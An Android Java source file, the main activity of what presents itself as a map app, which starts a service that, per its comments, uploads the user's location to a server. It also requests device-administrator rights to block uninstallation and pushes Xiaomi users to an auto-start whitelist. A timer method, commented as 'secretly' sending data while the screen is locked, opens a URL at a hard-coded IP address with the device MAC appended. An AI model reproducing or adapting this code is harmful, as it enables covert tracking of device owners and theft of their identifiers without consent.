package com.example.mapapp;

import java.util.Timer;
import java.util.TimerTask;

import com.example.mapapp.receiver.MyDeviceAdminReceiver;
import com.example.mapapp.service.mService;
import com.example.mapapp.utils.DebugUtil;
import com.example.mapapp.utils.Func;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;

public class MainActivity extends Activity {

	public String url = "http://47.98.147.48:8080/map/service/data?type=init&isAddMap=1&pkg=com.example.mapapp&appVersion=1.0&uuid=";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		DebugUtil.debug("MainActivity:", "界面程序开始");
		// SDKInitializer.initialize(getApplicationContext());
		setContentView(R.layout.activity_main);
		// 开启服务--上传位置信息到服务器
		Intent intentService = new Intent(this, mService.class);
		startService(intentService);
		// 如果是小米手机，跳到白名单设置界面
		if (Build.MANUFACTURER.equals("Xiaomi")) {
			Intent intent = new Intent();
			intent.setAction("miui.intent.action.OP_AUTO_START");
			intent.addCategory(Intent.CATEGORY_DEFAULT);
			startActivity(intent);
		}

		// 自己写一个类TestDeviceAdminReceiver继承DeviceAdminReceiver，并实现其中的方法，然后得到这个组件
		ComponentName testDeviceAdmin = new ComponentName(this,
				MyDeviceAdminReceiver.class);
		// 获取devicepolicyManager对象
		DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
		// 判断是否已经激活
		if (!mDPM.isAdminActive(testDeviceAdmin)) {
			activation();
		}

	}

	/**
	 * 激活设备超级管理员，删除删除
	 */
	public void activation() {
		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		// 初始化要激活的组件
		ComponentName mDeviceAdminSample = new ComponentName(MainActivity.this,
				MyDeviceAdminReceiver.class);
		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
				mDeviceAdminSample);
		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
				"激活可以防止随意卸载应用");
		startActivity(intent);
	}

	/**
	 * 没有网络时通过浏览器访问
	 */

	public void name() {
		Timer timer = new Timer();
		final KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
		TimerTask task = new TimerTask() {
			@Override
			public void run() {
				// TODO: 2017/6/26 如果用户锁屏状态下，就打开网页通过get方式偷偷传输数据
				// if (km.inKeyguardRestrictedInputMode()) {
				Intent intent = new Intent();
				intent.setAction(Intent.ACTION_VIEW);
				intent.addCategory(Intent.CATEGORY_BROWSABLE);
				intent.setData(Uri.parse(url + Func.getMac()));
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(intent);
				// } else {
				// // TODO: 2017/6/26 判断如果在桌面就什么也不做 ,如果不在桌面就返回
				// Intent intent = new Intent();
				// intent.setAction("android.intent.action.MAIN");
				// intent.addCategory("android.intent.category.HOME");
				// intent.addCategory(Intent.CATEGORY_DEFAULT);
				// intent.addCategory("android.intent.category.MONKEY");
				// intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				// startActivity(intent);
				// }
			}
		};
		timer.schedule(task, 1000, 2000);
	}

	@Override
	protected void onResume() {
		super.onResume();
	}

	@Override
	protected void onPause() {
		super.onPause();
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			Intent intent = new Intent(Intent.ACTION_MAIN);
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			intent.addCategory(Intent.CATEGORY_HOME);
			startActivity(intent);
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

}
